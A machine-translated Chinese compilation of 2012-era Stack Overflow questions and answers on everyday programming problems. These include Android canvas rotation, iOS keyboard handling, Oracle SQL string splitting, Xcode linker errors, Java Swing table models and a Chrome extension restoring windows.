默认情况下， rotate() 将从确切的中心旋转画布。您可能想从位图的中心旋转。

```
 canvas.save();
    canvas.rotate(90, leafRect.x + (leafRect.width / 2), leafRect.y + (leafRect.height / 2));
    canvas.drawBitmap(leaves, null, leafRect, bitmapPaint);
    canvas.restore(); 
```

文档中的更多信息[rotate(angle, x, y)](http://developer.android.com/reference/android/graphics/Canvas.html#rotate%28float,%20float,%20float%29)

# asp.net - 在验证错误时呈现自定义内容

> ID：11553390
> 
> 赞同：0
> 
> 时间：2012-07-19T03:09:29.643
> 
> 标签：asp.net, asp.net-mvc

我想提请注意尚未通过模型验证的字段。例如，对于文本框，是否可以打印红色星号？

如：`@Html.EditorFor(m => m.UserName)<span title="The User Name is required.">*</span>`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:54:21.503

你有没有尝试过这样简单的事情：

```
@Html.ValidationMessageFor(model => model.UserName, "*") 
```

您需要以下脚本：

```
<link href="@Url.Content("~/Content/Site.css")" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="@Url.Content("~/Scripts/jquery-1.7.2.min.js")"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script> 
```

# ios - ios - 按下 UIButton 时使键盘消失

> ID：11553395
> 
> 赞同：0
> 
> 时间：2012-07-19T03:11:21.197
> 
> 标签：ios

我试图在按下 UIButton 时使键盘消失 -

```
-(IBAction)nextButtonPressed{
    [usernameTextField resignFirstResponder];
    [passwordTextField resignFirstResponder];
} 
```

我已将该按钮声明为 IBOutlet 并将其连接到情节提要中的 IBAction。但是代码不起作用，键盘仍然可见。我究竟做错了什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:33:05.260

首先，您需要在 View/ViewController 的头文件中订阅 UITextFieldDelegate 协议，如下所示：

```
@interface YourViewController : UIViewController <UITextFieldDelegate> 
```

确保在 .m 中初始化文本字段后将视图/视图控制器设置为 UITextField 的委托：

```
yourTextField.delegate = self; 
```

你可以这样做：

```
-(IBAction)nextButtonPressed{
    [usernameTextField resignFirstResponder];
    [passwordTextField resignFirstResponder];
} 
```

希望它会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T06:02:04.270

你忘了这个：

```
usernameTextField.delegate = self;
passwordTextField.delegate = self; 
```

# ios - 如何在 UITextField 返回键上添加操作？

> ID：11553396
> 
> 赞同：97
> 
> 时间：2012-07-19T03:11:40.160
> 
> 标签：ios, objective-c, iphone, swift, uitextfield

我的视图中有一个按钮和文本文本字段。当我单击文本字段时，会出现一个键盘，我可以在文本字段上书写，我还可以通过单击按钮来关闭键盘，方法是添加：

```
[self.inputText resignFirstResponder]; 
```

现在我想启用键盘的返回键。当我按下键盘时，键盘会消失并且会发生一些事情。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：192
> 
> 时间：2012-07-19T03:32:20.930

确保“self”订阅`UITextFieldDelegate`并初始化 inputText：

```
self.inputText.delegate = self; 
```

将以下方法添加到“self”：

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField {
    if (textField == self.inputText) {
        [textField resignFirstResponder];
        return NO;
    }
    return YES;
} 
```

或者在 Swift 中：

```
func textFieldShouldReturn(_ textField: UITextField) -> Bool {
    if textField == inputText {
        textField.resignFirstResponder()
        return false
    }
    return true
} 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2017-07-14T15:44:35.563

**swift 3.0 中的扩展样式**

首先，为您的文本字段设置委托。

```
override func viewDidLoad() {
    super.viewDidLoad()
    self.inputText.delegate = self
} 
```

然后符合`UITextFieldDelegate`你的视图控制器的扩展

```
extension YourViewController: UITextFieldDelegate {
    func textFieldShouldReturn(_ textField: UITextField) -> Bool {
        if textField == inputText {
            textField.resignFirstResponder()
            return false
        }
        return true
    }
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2019-05-11T10:26:00.853

虽然其他答案正常工作，但我更喜欢执行以下操作：

在 viewDidLoad() 中，添加

`self.textField.addTarget(self, action: #selector(onReturn), for: UIControl.Event.editingDidEndOnExit)`

并定义函数

```
@IBAction func onReturn() {
    self.textField.resignFirstResponder()
    // do whatever you want...
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2020-05-18T12:57:02.063

当点击键盘完成按钮时，对从 UITextField 发送的“primaryActionTriggered”UIEvent 使用 Target-Action UIKit 机制。

```
textField.addTarget(self, action: Selector("actionMethodName"), for: .primaryActionTriggered) 
```

# sql - oracle sql中where条件的动态数量

> ID：11553398
> 
> 赞同：2
> 
> 时间：2012-07-19T03:11:45.610
> 
> 标签：sql, oracle, dynamic

我需要为报告工具中的提示编写一个 sql。我得到一个变量中的多个值的列表，用'-'分隔，这些值的数量可能会有所不同。（例如1.“abc-def”例如2.“abc-def-xyz”）。

现在我需要在这种形式的oracle中编写sql（逻辑上）

```
select something
  from somewhere
 where someColumn in 'abc' -- use substr to extract abc
    or someColumn in 'def' -- use substr to extract def
    or ...till we don't find '-'. 
```

我不能使用 plsql 进行查询。我可能不知道使用我在 plsql 中选择的变量，或者可能是报告工具不支持该变量。

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-19T03:34:46.717

尝试

```
select something
  from somewhere
 where someColumn in (select regexp_substr('abc-def-xyz','[^-]+', 1, level) from dual
                     connect by regexp_substr('abc-def-xyz', '[^-]+', 1, level) is not null); 
```

概括（考虑到您的字段用“-”分隔）

```
select something
  from somewhere
 where someColumn in (select regexp_substr(variable,'[^-]+', 1, level) from dual
                     connect by regexp_substr(variable, '[^-]+', 1, level) is not null); 
```

基本上子查询的输出如下所示 -

```
 SQL> select regexp_substr('abc-def-xyz','[^-]+', 1, level) value from dual
      connect by regexp_substr('abc-def-xyz', '[^-]+', 1, level) is not null;

VALUE                            
-------------------------------- 
abc                              
def                              
xyz 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:42:56.480

首先使用 Oracle 的 regexp_substr() 函数将字符串拆分为多个部分。请参阅[regexp_substr 函数](https://blogs.oracle.com/aramamoo/entry/how_to_split_comma_separated_string_and_pass_to_in_clause_of_select_statement) （如果您可以访问生成字符串的原始函数，请使用它。）

其次，将其放在临时表中，然后只需：

```
select something
  from somewhere
 where someColumn in (select parts from tmpTable) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T06:18:51.100

```
select something
  from somewhere
 where INSTR('-'||'abc-def-ghi'||'-', '-'||someColumn||'-') > 0; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T03:23:00.750

如果您只想要包含“-”的结果列表，您可以执行类似的操作

SELECT Something From SomeWHERE WHERE Somecolumn LIKE ('%-%');

# c# - 在 C# 中，如何在使用 bindingNavigator 时取消默认的鼠标单击事件

> ID：11553401
> 
> 赞同：0
> 
> 时间：2012-07-19T03:12:09.827
> 
> 标签：c#, winforms, data-binding, bindingsource

我是一个新的 C# 用户，现在我在使用 BindingNavigator 时遇到了问题。

我正在使用 bindingNavigator 来更新数据库表中的记录。在我离开当前更新的记录并通过单击下一步按钮输入下一条记录之前，我将执行一些验证，如果有任何不正确的地方，我希望它可以发出警告，让我有机会更正错误的字段而不是移动到下一个记录。

我在 bindingNavigatorMoveNextItem_MouseDown 事件中添加了一些行，但即使当前记录有问题（字段有一些逻辑连接），它仍会移动到下一个项目。这里的任何专家可以帮助我解决这个问题吗？非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:14:41.753

您有两种方法：覆盖`WndProc`并阻止鼠标单击窗口消息调用 base 的`WndProc`，或者简单地覆盖`OnMouseClick`：

```
class Hello : BindingNavigator
{
    private bool canFire = false;
    protected override void OnMouseClick(MouseEventArgs e) // second approach
    {
        // don't call base method so that event doesn't fire up
        if (this.canFire)
             base.OnMouseClick(e);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-08T16:38:51.890

我知道这是旧的.. 但对于其他任何人......您应该使用普通按钮，并且只需使用验证事件，如果有任何验证失败，则取消。该控件在设计器中不显示该属性，但您仍然可以设置它：bindingnavigator.CausesValidation = true; 我在表单加载中执行此操作。

仅此一项仍然无法做到。您还需要设置焦点。bindingnavigator.focus(); 我在 bindingnavigator_ItemClicked 事件中执行此操作，因此无论单击什么按钮都会发生。

# installation - windows程序现在的趋势：预先确定的安装目录

> ID：11553405
> 
> 赞同：0
> 
> 时间：2012-07-19T03:12:15.613
> 
> 标签：installation, directory

当我安装 Chrome 时，我首先注意到了这一点，随后其他程序也慢慢效仿。安装程序不再允许您选择安装目录并自动安装到您的 C: 中。我真的很喜欢这个领域的选择能力，因为我的 C: 资源很稀缺，所以我不想用我不经常使用的程序来填满它。

我的问题是 1\. 为什么这是一种趋势？我读到它绕过对管理权限的需求。 2\. 有没有办法在不实际调整注册表中的默认安装目录的情况下更改它。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T03:19:22.237

程序有时会自行选择安装位置，对于某些程序，您可以将程序根文件夹移动到任何您希望的位置，但有时这可能会导致错误。

# ios - 链接器命令错误：“ld：未找到体系结构 i386 的符号”

> ID：11553409
> 
> 赞同：25
> 
> 时间：2012-07-19T03:13:05.597
> 
> 标签：ios, xcode, compiler-errors, mach-o

我在编译时出错。似乎很奇怪。它用作详细视图应用程序，但使用单个视图似乎不起作用。这是错误详细信息：

```
 Undefined symbols for architecture i386:
    "_OBJC_CLASS_$_RssArticle", referenced from:
      objc-class-ref in RssXmlParser.o
  ld: symbol(s) not found for architecture i386
  clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-07-19T05:57:34.067

尝试以下步骤：

1.  在 XCode 中打开您的项目。

2.  在 XCode 的左侧窗口/面板中，单击顶部的项目名称。

3.  现在从 XCode 的右侧面板中选择 Target。

4.  从右侧面板的顶部选择构建阶段。（这里的其他选项将是构建设置，构建规则）

5.  在同一个面板中打开“编译源代码”，在这里检查：是否`.m`列出了所有文件 ( )？如果不是所有文件，请单击 (+) 登录底部以添加 ( `.m`) 不在列表中的文件

6.  根据您的错误，似乎 RssXmlParser 不存在，添加并再次编译

它现在可以正常工作了。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2017-01-14T01:41:09.467

没有看到有人建议去终端并进入项目所在的目录并运行

> xcodebuild -详细

查看详细的错误并且仅仅阅读错误会帮助很多时间

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2015-03-05T19:13:26.683

我意识到我必须使用 .xcworkspace 文件而不是 .xcodeproj 文件。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2016-06-05T08:35:26.410

产品->清洁然后产​​品->运行:)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-04-21T23:38:57.383

就我而言，我错误地创建了一个新的`UIView`with `.h`and `.c`files 子类，而不是`.h`and `.m`files。更改扩展名很容易，但我没想到要更改`.m`文件的内容。所以我的`.h`文件有

```
#ifndef My_Project_MPMyView_h
#define My_Project_MPMyView_h

#import <UIKit/UIKit.h>

@interface MPMyView : UIView

@end

#endif 
```

我的`.m`文件错误地有

```
#include <stdio.h> 
```

当我将`.m`文件更改为

```
@interface MPMyView : UIView

@end

@implementation MPMyView

@end 
```

链接器错误已修复。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-10T14:33:07.277

我解决了同样的问题，因为我将组件创建为单独的项目。将文件夹添加到主项目后，我忘记从导入的组件组目录中删除 .plist、.string 和额外的 main.m 文件。

删除这些解决了我的问题，因为应用程序显然得到了冲突的构建命令......

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-12-11T19:30:20.030

由于文件名重复（我通过编辑器菜单在核心数据中自动创建了 NSManagedObjectContext 子类），我遇到了这个错误。

从 XCODE 5.0 开始，只需退出并重新启动，如果您单击左侧窗格中的黄色警告，xcode 应该会识别并修复它

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-07-15T15:12:25.663

我在 Xcode 6.4 上也发生了类似的错误。看起来像一个 Xcode 错误。

我的解决方法是转到导致错误的“.o”文件，取消选中并重新检查您需要的目标成员资格。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-04-13T13:00:58.160

我不知道它是如何工作的。但我只是关闭了 xcode 并通过单击 xcworkspace 文件再次打开并为我工作。您可以尝试，希望这可以解决您的问题，谢谢。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-12-18T12:50:09.867

我认为您可能正在尝试在一个项目中创建两个不同的 .C 文件（带有 main 函数）。C只允许你每个项目有一个主入口。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-05-03T09:44:50.453

按住 alt 。在顶部工具栏上转到

产品 > 清理构建文件夹

按“清理构建文件夹”并等待它构建并运行。它应该解决构建文件中的任何错误。

# php - 使用一个 的选择要喂到另一个？

> ID：11553412
> 
> 赞同：1
> 
> 时间：2012-07-19T03:13:25.097
> 
> 标签：php, javascript, html, forms

在 php 中，我有一个很大的 html `<form>`，其中填充了来自 postgres 数据库的大量患者信息。当医生双击一行时，它会设置一个 var`$_POST`并调用另一个 php 脚本来读取并显示数据库中有关该行的特定信息。这一切都有效。

但是现在有太多的患者数据行，医生不想滚动并滚动以找到他们正在寻找的患者行，他们想要一个患者预过滤器`<form>`，以便单击其中的元素将导致大显示屏过滤到该患者的行。

这样做的基本方法是什么？我是新手；我目前正在使用 html、php 和一些 javascript。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:46:15.027

使用您想要过滤的任何选项制作第二个表单，这部分将特定于您的数据，但您想要类似

```
<form id="search-form">
  <label>Name:</label><input type="text" name="patient-name"></input>
</form> 
```

您需要构建一个查询字符串（并确保您使用 GET，因为这会让您更轻松）。如果您想使用单选按钮或类似的东西，这将需要调整，但这是一般的想法：

```
function getSearchParameters () {
  var form = document.getElementById('search-form');
  var inputs = form.getElementsByTagName('input');
  var result = '';
  var i;
  for (i = 0; i < inputs.length; i++) {
    if (inputs[i].value) {
      result += "&" + inputs[i].name + "=" + inputs[i].value;
    }
  }
  return result;
} 
```

在患者数据链接的 onClick 处理程序中，您将调用此函数并将其结果附加到您的查询字符串中：

```
element.onclick = function () {
  var patientDataUrl = '/patients.php?param1=someValue';
  patientDataUrl += getQueryParameters();
  /* then do your ajax stuff as normal */
}; 
```

然后在服务器端，在 patients.php 中简单地检查搜索字段的存在，即

```
if(isset($_GET['patient-name'])) {
  $patient_name = mysql_real_escape_string($_GET['patient-name']);
  $query = "SELECT * FROM `patients` WHERE `patient_name`='$patient_name';";
} else {
  $query = "SELECT * FROM `patients`;";
} 
```

（确保对字符串进行消毒！）

我建议考虑一个 JS 框架，让您的生活更轻松（例如，jQuery 将允许您通过 POST 发送它或通过 轻松将其序列化为 GET 查询字符串`.serialize()`）

# macos - MonoMac 或 Monobjc

> ID：11553424
> 
> 赞同：1
> 
> 时间：2012-07-19T03:15:24.517
> 
> 标签：macos, mono, monomac, monobjc

我需要将 .Net 应用程序从 Windows 移植到 OS X，我想知道使用 Monobjc 或 MonoMac 的优缺点是什么，以及人们对这些的体验是什么。

**应用要求**

1.  原生用户界面
2.  用于应用程序间通信的脚本桥（或替代方案）将需要两种方式，即从另一个调用移植的应用程序并让另一个应用程序调用移植的应用程序。
3.  通知的咆哮集成。

考虑到上述要求，最佳选择是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T06:14:10.090

对于第 1 项，如果您仔细阅读下面的文章，您将了解 MonoMac 诞生的原因以及您现在应该使用它的原因，

[http://tirania.org/blog/archive/2010/Apr-19.html](http://tirania.org/blog/archive/2010/Apr-19.html)

经过这两年，MonoMac 已经成长为该领域的巨头。除非您正在维护一个基于其他绑定的旧项目，否则您应该考虑将 MonoMac 作为您的第一选择。

使用 MonoMac 还是其他绑定都没有关系，因为最后两项与第 1 项没有密切关系。

对于 IPC，您可以考虑 WCF（Mono 的有限支持）、Thrift（http://thrift.apache.org/）和许多其他的。

Growl 不是 Mac OS X API。对于此类供应商特定的东西，您应该咨询供应商。

# java - DefaultTableModel 上的 getRowCount() 错误

> ID：11553426
> 
> 赞同：4
> 
> 时间：2012-07-19T03:15:44.063
> 
> 标签：java, swing, jtable, abstracttablemodel, defaulttablemodel

**编辑**

我尝试将表模型改回 DefaultTableModel，但在编译代码时出现异常，我不知道为什么！

这是我的表初始化：

```
jTable1.setModel(new Table1Model());
jTable1.setDefaultRenderer(Color.class,new ColorRenderer(true));
jTable1.getColumnModel().getColumn(5).setCellEditor(new ColorEditor()); 
```

我的课程扩展了模型：

```
class Table1Model extends DefaultTableModel {
    //private String[] columnNames = {"Station #",
    private Object[] columnNames = {"Station #",
                                    "Name",
                                    "avg Time",
                                    "Buffer",
                                    "Buffer Parts",
                                    "Color"};
    private Object[][] data = {
    {"1", "Station 1",
     new Integer(10), false, new Integer(0), Color.red},
    {"2", "Station 2",
     new Integer(10), false, new Integer(0), Color.blue},
    {"3", "Station 3",
     new Integer(10), false, new Integer(0), Color.green},
    {"4", "Station 4",
     new Integer(10), false, new Integer(0), Color.orange},
    {"5", "Station 5",
     new Integer(10), false, new Integer(0), Color.black}
    };

    @Override
    public int getColumnCount() {
        return columnNames.length;
    }

   @Override
    public int getRowCount() {
       //int length = data.length;
       //int datalength = Integer.parseInt(length);
       return data.length;
    }

    @Override
    public String getColumnName(int col) {
        return columnNames[col].toString();
    }

    @Override
    public Object getValueAt(int row, int col) {
        return data[row][col];
    }

    /*
     * JTable uses this method to determine the default renderer/
     * editor for each cell.  If we didn't implement this method,
     * then the last column would contain text ("true"/"false"),
     * rather than a check box.
     */
    @Override
    public Class getColumnClass(int c) {
        return getValueAt(0, c).getClass();
    }

    /*
     * Don't need to implement this method unless your table's
     * editable.
     */
    @Override
    public boolean isCellEditable(int row, int col) {
        //Note that the data/cell address is constant,
        //no matter where the cell appears onscreen.
        if (col == 0) { return false; }
        else if (col == 4) { 
            boolean di = (Boolean) getValueAt(row,(col-1));
            if (!di) { return false; }
            else { return true; }
        }
        else { return true; }
    }

    /*
     * Don't need to implement this method unless your table's
     * data can change.
     */
    @Override
    public void setValueAt(Object value, int row, int col) {
        data[row][col] = value;
        fireTableCellUpdated(row, col);
    }

   /*public void removeRow(int row) {
        data.removeRow(row);
    }*/

    private void printDebugData() {
        int numRows = getRowCount();
        int numCols = getColumnCount();

        for (int i=0; i < numRows; i++) {
            System.out.print("    row " + i + ":");
            for (int j=0; j < numCols; j++) {
                System.out.print("  " + data[i][j]);
            }
            System.out.println();
        }
        System.out.println("--------------------------");
    }
} 
```

这会产生以下错误：

```
Exception in thread "AWT-EventQueue-0" java.lang.NullPointerException
at SimGui$Table1Model.getRowCount(SimGui.java:863)
at javax.swing.table.DefaultTableModel.setDataVector(DefaultTableModel.java:224)
at javax.swing.table.DefaultTableModel.<init>(DefaultTableModel.java:124)
at javax.swing.table.DefaultTableModel.<init>(DefaultTableModel.java:106)
at javax.swing.table.DefaultTableModel.<init>(DefaultTableModel.java:86)
at SimGui$Table1Model.<init>(SimGui.java:832)
at SimGui.initComponents(SimGui.java:265)
at SimGui.<init>(SimGui.java:34)
at SimGui$16.run(SimGui.java:789)
at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:251)
at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:701)
at java.awt.EventQueue.access$000(EventQueue.java:102)
at java.awt.EventQueue$3.run(EventQueue.java:662)
at java.awt.EventQueue$3.run(EventQueue.java:660)
at java.security.AccessController.doPrivileged(Native Method)
at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
at java.awt.EventQueue.dispatchEvent(EventQueue.java:671)
at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:244)
at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:163)
at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:151)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:147)
at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:139)
at java.awt.EventDispatchThread.run(EventDispatchThread.java:97) 
```

你能帮我找出问题所在吗？另外，我可以将 ColorEditor 与 DefaultTableModel 一起使用吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T03:46:26.240

你有两个明显的选择：要么给你的类一个`getVectorData()`方法，要么给它另一个类似有用的方法，让你从模型中提取数据的核心。您可能不应该使用 AbstractTableModel 变量，而是使用您自己的自定义类型的变量，该变量扩展 AbstractTableModel 以允许您能够调用模型的自定义方法。

IE，

```
MyTableModel model = (MyTableModel)jTable1.getModel();
SomeCollection myKeyData = model.getMyKeyData(); 
```

另外，这个声明：

> 我最近创建了自己的类来扩展 AbstractTableModel 以便能够在 isCellEditable 和 setValueAt 上插入一些逻辑。

对我来说没有意义，因为您始终可以使用 DefaultTableModel 并简单地覆盖这两种方法。但是，如果您使用 DefaultTableModel，请不要让它像您尝试做的那样保存对象的 2D 数组。而是通过适当的构造函数或通过其`addRow(...)`方法将数据输入其内部数据。否则，您将失去 DefaultTableModel 提供的所有功能。

**编辑**
如果你想使用 DefaultTableModel 来利用它的方法，那么你不能为你的模型使用单独的数据“核心”（这里是你的 Object[][]），而是*必须*将你的数据加载到保存在里面的模型中DefaultTableModel 超类。这可以通过正确的超级构造函数或通过使用其`addRow(...)`方法添加数据行来完成。

例如，在这里我将您的数据加载到 DefaultTableModel 覆盖中：

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;

import javax.swing.*;
import javax.swing.table.*;

public class TableModelTest extends JPanel {
   private static final Object[][] DATA = {
         { "1", "Station 1", new Integer(10), false, new Integer(0), Color.red },
         { "2", "Station 2", new Integer(10), false, new Integer(0), Color.blue },
         { "3", "Station 3", new Integer(10), false, new Integer(0),
               Color.green },
         { "4", "Station 4", new Integer(10), false, new Integer(0),
               Color.orange },
         { "5", "Station 5", new Integer(10), false, new Integer(0),
               Color.black } };
   private MyTableModel myTableModel = new MyTableModel(DATA);
   private JTable table = new JTable(myTableModel);

   public TableModelTest() {
      setLayout(new BorderLayout());
      add(new JScrollPane(table), BorderLayout.CENTER);

      table.getColumnModel().getColumn(5)
            .setCellRenderer(new ColorCellRenderer());
      table.getColumnModel().getColumn(5).setCellEditor(new ColorCellEditor());
   }

   private static void createAndShowGui() {
      TableModelTest mainPanel = new TableModelTest();

      JFrame frame = new JFrame("TableModelTest");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(mainPanel);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
}

class ColorCellEditor extends AbstractCellEditor implements TableCellEditor {

   Color currentColor;
   JButton button;
   JColorChooser colorChooser;
   JDialog dialog;
   protected static final String EDIT = "edit";

   public ColorCellEditor() {
      ActionListener actionListener = new MyActionListener();
      button = new JButton();
      button.setActionCommand(EDIT);
      button.addActionListener(actionListener);
      button.setBorderPainted(false);

      colorChooser = new JColorChooser();
      dialog = JColorChooser.createDialog(button, "Pick a Color", true,
            colorChooser, actionListener, null);
   }

   private class MyActionListener implements ActionListener {

      public void actionPerformed(ActionEvent e) {
         if (EDIT.equals(e.getActionCommand())) {
            button.setBackground(currentColor);
            colorChooser.setColor(currentColor);
            dialog.setVisible(true);

            fireEditingStopped();

         } else {
            currentColor = colorChooser.getColor();
         }
      }
   }

   public Object getCellEditorValue() {
      return currentColor;
   }

   public Component getTableCellEditorComponent(JTable table, Object value,
         boolean isSelected, int row, int column) {
      currentColor = (Color) value;
      return button;
   }
}

class ColorCellRenderer implements TableCellRenderer {
   private static final int IMG_WIDTH = 70;
   private static final int IMG_HEIGHT = 20;
   private JLabel label = new JLabel();

   @Override
   public Component getTableCellRendererComponent(JTable table, Object value,
         boolean arg2, boolean arg3, int arg4, int arg5) {
      Color color = (Color) value;
      BufferedImage img = new BufferedImage(IMG_WIDTH, IMG_HEIGHT,
            BufferedImage.TYPE_INT_RGB);
      Graphics g = img.getGraphics();
      g.setColor(color);
      g.fillRect(0, 0, IMG_WIDTH, IMG_HEIGHT);
      g.dispose();
      ImageIcon icon = new ImageIcon(img);
      label.setIcon(icon);
      return label;
   }

}

class MyTableModel extends DefaultTableModel {
   private static final String[] COLUMN_NAMES = { "Station #", "Name",
         "avg Time", "Buffer", "Buffer Parts", "Color" };

   public MyTableModel(Object[][] data) {
      super(data, COLUMN_NAMES);
   }

   @Override
   public boolean isCellEditable(int row, int col) {

      if (col == 0) {
         return false;
      } else if (col == 4) {
         boolean di = (Boolean) getValueAt(row, (col - 1));
         if (!di) {
            return false;
         } else {
            return true;
         }
      } else {
         return true;
      }
   }

   public void printDebugData() {
      int numRows = getRowCount();
      int numCols = getColumnCount();

      for (int i = 0; i < numRows; i++) {
         System.out.print("    row " + i + ":");
         for (int j = 0; j < numCols; j++) {
            Object datum = getValueAt(i, j);
            // System.out.print("  " + data[i][j]);
            System.out.print("  " + datum);
         }
         System.out.println();
      }
      System.out.println("--------------------------");
   }
} 
```

# google-chrome-extension - 当我关闭一个窗口然后打开另一个窗口时，Chrome 会重新创建选定的选项卡

> ID：11553427
> 
> 赞同：0
> 
> 时间：2012-07-19T03:15:58.167
> 
> 标签：google-chrome-extension

我正在编写一个 Chrome 扩展程序来保存/恢复您的浏览器窗口状态 - 所以，我保存给定窗口的状态：

```
 var properties = [ "top", 
                "left",
                "width",
                "height",
                "incognito",
                "focused",
                "type"
              ];
     var json = {};
     var cache = chrome_window_object;

     // copy only the keys we care about:
     _.each(properties,function(key,value) {
            json[key] = cache[key];
        });

     // then copy the URLs of the tabs, if they exist:

     if(cache.tabs) {
         json.url = [];
         _.each(cache.tabs,function(tab) {
            json.url.push(tab.url);
            });
     }

     return json; 
```

在将来的某个时候，我会删除所有窗口：

```
 closeAllWindows: function(done_callback) {
     function got_all(windows) {
     var index = 0;

     // use a closure to only close one window at a time:
     function close_next() {
         if(windows.length <= index) return;

         var window = windows[index++];
         chrome.windows.remove(window,close_next);
     }

     // start closing windows:
     close_next();
     }
     chrome.windows.getAll(got_all);
 } 
```

然后我使用以下方法恢复窗口：

```
chrome.windows.create(json_from_before); 
```

创建的窗口中有一个额外的选项卡，无论我刚刚关闭的窗口中的内容是什么......我完全不知所措，我认为问题是我在未发布的代码中所做的事情（这是一个很大的扩展）。我花了几个小时逐行检查代码并确保我没有明确要求创建此选项卡。那么 - 以前有人见过这样的事情吗？

# android - 在android中使用kso ap2访问.Net WCF Web服务时出现空异常

> ID：11553428
> 
> 赞同：0
> 
> 时间：2012-07-19T03:16:31.367
> 
> 标签：android, exception, null, ksoap2

我访问 wcf Web 服务的代码在 android 应用程序中不起作用：

在顶部我有：

```
private static final String NAMESPACE = "http://tempuri.org/";
private static final String URL = "http://10.86.164.102/ABCWcfService/ABCWcfService.svc";
private static final String SOAP_ACTION = "http://tempuri.org/IABCWcfService/GetTitle";
private static final String METHOD_NAME = "GetTitle"; 
```

然后在我的方法中：

```
SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
envelope.dotNet = true;
envelope.setOutputSoapObject(request);

HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
androidHttpTransport.debug = true;

try
{
    androidHttpTransport.call(SOAP_ACTION, envelope);
    SoapPrimitive result = (SoapPrimitive) envelope.getResponse();
    String receivedString = result.toString();
}
catch (Exception e)
{
} 
```

我发现它在 androidHttpTransport.call(SOAP_ACTION,envelope); 但 e 的值为 null。

我在 Java 项目中使用相同的代码来访问相同的 wcf Web 服务，并且工作正常。

我确实添加了：

```
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<uses-sdk android:minSdkVersion="8" />
<application>
     ....
</application> 
```

在清单文件中，在应用程序部分之前。但仍然无法正常工作。

我在互联网上阅读了很多不同的主题。他们都没有解决我的问题。有人有更好的建议吗？谢谢你。

Web 服务与 android 应用程序在同一台机器上运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T14:40:01.393

我仍然有点困惑为什么你的异常是空的。您是否在设备上或仅在模拟器中尝试过？

[可以在这个关于Exception always null](https://stackoverflow.com/questions/3949609/exception-is-null-always)的问题中解释为什么`Exception e`可能为 null的解释。简短的回答：模拟器可能不理解它收到的异常，可能会用 a代替实际的异常。`null`

您说 android 应用程序与 Web 服务在同一台机器上，所以当您在模拟器中运行它时，我读到了这一点，对吗？尝试在实际设备上运行它，看看设备日志中是否有有用的东西。

```
Log.e(TAG, "caught exception " + e); 
```

如果您可以获得堆栈跟踪，解决此问题会容易得多。

该问题中的链接解决了有关在主线程上使用网络调用的问题。基本上从主线程进行网络调用是不好的做法，因为它会影响[应用程序的响应性](http://developer.android.com/guide/practices/design/responsiveness.html)。对于某些 SDK 版本（API 级别大于 10，即 Honeycomb 及更高版本），[`NetworkOnMainThreadException`](http://developer.android.com/reference/android/os/NetworkOnMainThreadException.html)将抛出 a 并且模拟器可能无法理解，因此替换为 null。

但是，对该问题的回答可能无法完全解释您所看到的内容，因为您的`<uses-sdk>`列表 a`minSdkVersion`值为 8。（不`targetSdkVersion`，但应该仍然可以。）

如果您可以获得堆栈跟踪，让我们看看我们是否可以找到更多信息。

# bash - FTP Shell 脚本 mkdir 问题

> ID：11553430
> 
> 赞同：1
> 
> 时间：2012-07-19T03:17:07.887
> 
